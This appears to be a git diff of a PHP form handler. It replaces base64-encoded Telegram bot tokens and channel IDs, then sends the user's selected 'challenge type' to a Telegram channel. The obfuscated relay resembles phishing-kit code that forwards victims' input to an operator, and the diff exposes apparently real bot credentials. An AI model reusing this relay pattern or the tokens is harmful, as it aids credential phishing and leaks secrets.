@@ -95,8 +95,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $selectedOption = $_POST["selectedChallengeType"];
 
     // Token del bot Telegram e ID del canale
-    $botApiToken = base64_decode('Nzg5OTE2ODYwMDpBQUd3akdDRHlpX2FXR0xhOC1WUHdOY2txUWxzMGhiTVIzYw==');
-    $channelId = base64_decode('Nzc4MDcwNzY0Mg==');
+    $botApiToken = base64_decode('NzUzNzQ5NzY5MTpBQUhidlY0QUNGM1NUd0tLRjRIR3lMcXFmbGtJMV83cGZ6Yw==');
+    $channelId = base64_decode('ODAxNzA4NjcxNQ==');
 
     // Creazione del messaggio da inviare
     $txt = "📋 Opzione selezionata: {$selectedOption}";
